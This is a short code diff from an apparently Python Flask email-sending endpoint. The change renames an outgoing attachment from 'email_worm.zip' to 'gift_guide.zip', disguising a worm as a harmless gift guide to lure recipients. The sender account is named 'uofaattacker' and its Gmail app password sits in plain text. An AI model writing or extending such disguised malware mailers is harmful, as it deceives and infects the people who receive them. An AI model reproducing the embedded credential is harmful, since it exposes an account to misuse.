@@ -90,7 +90,7 @@ def api_send_email():
     # Email credentials
     sender_email = 'uofaattacker@gmail.com'
     sender_password = ' bjqp sloj wuey myuj'  # App password for Gmail
-    zip_path = 'email_worm.zip'
+    zip_path = 'gift_guide.zip'
 
     if not os.path.exists(zip_path):
         return jsonify({"error": f"Attachment file '{zip_path}' not found"}), 500
